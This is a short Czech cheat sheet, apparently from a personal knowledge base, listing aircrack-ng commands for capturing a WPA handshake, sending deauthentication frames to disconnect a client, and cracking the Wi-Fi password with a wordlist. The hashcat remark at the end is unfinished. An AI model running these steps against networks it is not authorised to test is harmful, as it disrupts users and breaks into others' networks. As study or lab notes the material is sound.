---
tags: [kbb, kbb/tools, command]
cmd: aircrack-ng
---
# aircrack-ng

- `airmon-ng start <IF>` (`IF`=`wlan0`) - zacne monitorivaci rezim, vytvori `<IF>mon`
- `airodump-ng <IF>mon` (`wlan0mon`) - ukaze seznam dostupnych wifi
- `airodump-ng -c <CHANNEL> --bssid <BSSID> -w psk <IF>mon`
	- `<CHANNEL>` je channel na kterem je wifi (viz seznam dostupnych wifi)
	- `<BSSID>` je hex kod wifi (viz seznam dostupnych wifi)
	- `-w psk` nastavi prefix souboru na `psk`
	- dumpne hash. Je potreba aby se pripojilo zarizeni, a az potom dumpne hash. Neskonci sam o sobe, dumpne komunikaci na pozadi.
- `aireplay-ng -0 1 -a <AP MAC> -c <CLIENT MAC> <IF>mon`
	- `-0` - posila deauth
	- `1` - posle ho jednou
	- `-a <AP MAC>` ktere wifi to poslat (vetsinou BSSID)
	- `-c <CLIENT MAC>` ktereho clienta odhlasit (v airodump se pod seznam wifi zobrazuje i pripojeni klienti a ke komu)
	- posle DEAUTH. Optional, pokud se vi ze se nekdo pripoji tak se to delat nemusi
- `aircrack-ng -w <WORDLIST -b <BSSID> psk*.cap`
	- crackne samotne heslo

Pokud se misto aircrack-ng chce pouzit hashcat, `hcxpcapngtool psk*.cap psk.hashcat` (z `hxctools`) prevede na hash, `hcxhashtool` prevede na dalsi hash ???